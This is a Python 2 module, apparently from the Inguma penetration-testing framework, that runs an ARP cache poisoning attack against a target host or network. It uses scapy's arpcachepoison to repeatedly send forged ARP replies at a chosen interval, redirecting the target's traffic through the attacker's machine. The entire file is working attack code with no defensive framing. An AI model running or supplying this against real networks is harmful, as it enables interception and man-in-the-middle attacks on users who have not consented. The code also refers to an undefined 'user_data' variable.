#!/usr/bin/python
"""
Module ARP cache poison for Inguma
Copyright (c) 2007 Joxean Koret <joxeankoret@yahoo.es>

License is GPL
"""

try:
    from scapy.all import get_if_addr, get_working_if, arpcachepoison, conf
    bHasScapy = True
except:
    bHasScapy = False

from lib.core import getMacVendor
from lib.libexploit import CIngumaModule

name = "arppoison"
brief_description = "Poison target's ARP cache"
type = "gather"

globals = ["interval", ]

class CArpCachePoison(CIngumaModule):

    target = ""
    waitTime = 0
    timeout = 2
    wizard = False
    interval = 30
    dict = None
    address = ""

    def help(self):
        print "target = <target host or network>"
        print "interval = <interval>"

    def run(self):
        if self.target == "" or self.target.lower() == "localhost":
            self.gom.echo( "[!] No target (or valid target) selected." )
            return False

        conf.verb = 2
        self.address = get_if_addr(get_working_if())
        self.gom.echo( "[+] Using " + str(self.address) )
        self.gom.echo( "  --> Cache poisoning, interval " + str(self.interval) )
        if user_data['isGui'] == False:
            self.gom.echo( "Press Ctrl+C to cancel" )
        arpcachepoison(self.address, self.target, self.interval)
        return True
    
    def printSummary(self):
        pass


